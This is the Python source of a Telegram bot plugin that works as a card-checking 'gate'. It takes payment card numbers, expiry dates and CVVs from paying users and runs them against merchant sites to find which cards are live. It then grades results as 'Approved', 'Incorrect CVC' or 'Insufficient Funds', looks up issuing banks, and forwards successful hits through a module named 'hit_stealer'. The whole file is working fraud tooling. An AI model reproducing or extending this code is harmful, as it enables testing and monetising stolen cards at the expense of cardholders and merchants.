from pyrogram import Client, filters
from pyrogram.enums import ChatType
from pyrogram.types import Message
from plugins.func.users_sql import get_all_custom_gates, fetchinfo, updatedata, plan_expirychk
from plugins.gates.auto import check_and_add_site
from plugins.tools.hit_stealer import send_hit_if_approved
import re, time, httpx

@Client.on_message(filters.text & (filters.private | filters.group), group=99)
async def handle_dynamic_commands(client, message: Message):
    user_id = str(message.from_user.id)
    text = message.text.strip()

    if not (text.startswith("/") or text.startswith(".")):
        return

    command_raw = text.split(" ", 1)[0][1:].lower()
    gates = get_all_custom_gates(user_id)
    gate = next((g for g in gates if g[0].lower() == command_raw), None)
    if not gate:
        return

    regdata = fetchinfo(user_id)
    if not regdata:
        return await message.reply("❌ You are not registered. Use /register")

    if message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
        with open("plugins/group.txt") as f:
            allowed_groups = f.read().splitlines()
        if str(message.chat.id) not in allowed_groups:
            return await message.reply("❌ Unauthorized group.")

    role = regdata[2].upper() if regdata[2] else "FREE"
    credit = int(regdata[5] or 0)
    wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
    antispam_time = int(regdata[7] or 0)
    now = int(time.time())

    if role == "FREE":
        return await message.reply("❌ This gate is only available to Premium users.")
    if credit < 1:
        return await message.reply("❌ You have no credits.")
    if now - antispam_time < wait_time:
        return await message.reply(f"⏳ Wait {wait_time - (now - antispam_time)}s")

    cc_raw = message.reply_to_message.text if message.reply_to_message else text.split(" ", 1)[1] if len(text.split()) > 1 else None
    if not cc_raw:
        return await message.reply(f"❌ No card found.\nUsage: /{command_raw} cc|mm|yy|cvv")

    match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_raw)
    if not match:
        return await message.reply("❌ Invalid format. Use cc|mm|yy|cvv")

    cc = "|".join(match.groups())
    site_url, gate_name, shipping = gate[1], gate[2], gate[3]
    gate_label = gate_name.replace("$", "") if gate_name else "Unnamed"

    checking_msg = await message.reply(f"""<code>┏━━━━━━━⍟</code>
<b>┃  {gate_label}</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{cc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...""")

    start = time.perf_counter()
    success, result_msg, raw_data = await check_and_add_site(cc, site_url, email=None, shipping=shipping == "True")
    duration = time.perf_counter() - start

    updatedata(user_id, "credits", credit - 1)
    updatedata(user_id, "antispam_time", now)
    plan_expirychk(user_id)

    # BIN Lookup
    bin_code = cc.split("|")[0][:6]
    try:
        async with httpx.AsyncClient(timeout=10) as http_client:
            r = await http_client.get(f"https://api.voidex.dev/api/bin?bin={bin_code}")
            b = r.json()
            brand = b.get("brand", "UNKNOWN").upper()
            type_ = b.get("type", "N/A").upper()
            level = b.get("level", "N/A").upper()
            bank = b.get("bank", "N/A").upper()
            country = b.get("country_name", "N/A").upper()
            flag = b.get("country_flag", "🏳️")
    except:
        brand = type_ = level = bank = country = "N/A"
        flag = "🏳️"

    msg = result_msg.lower()
    if any(x in msg for x in ["charged", "processedreceipt"]):
        status = "Approved ✅"
    elif "zip" in msg:
        status = "Incorrect Zip ✅"
    elif "cvc" in msg or "cvv" in msg:
        status = "Incorrect CVC ✅"
    elif "insufficient" in msg:
        status = "Insufficient Funds ✅"
    elif "avs" in msg:
        status = "AVS Match ✅"
    else:
        status = "Declined ❌"

    final_msg = f"""<code>┏━━━━━━━⍟</code>
<b>┃  {gate_label}</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{cc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {result_msg}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {duration:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>"""

    try:
        if checking_msg.text != final_msg:
            await checking_msg.edit(final_msg)
    except Exception as e:
        if "MESSAGE_NOT_MODIFIED" not in str(e):
            await message.reply(f"❌ Edit error: {e}")

    if "charged" in msg or "processedreceipt" in msg:
        await send_hit_if_approved(client, final_msg)
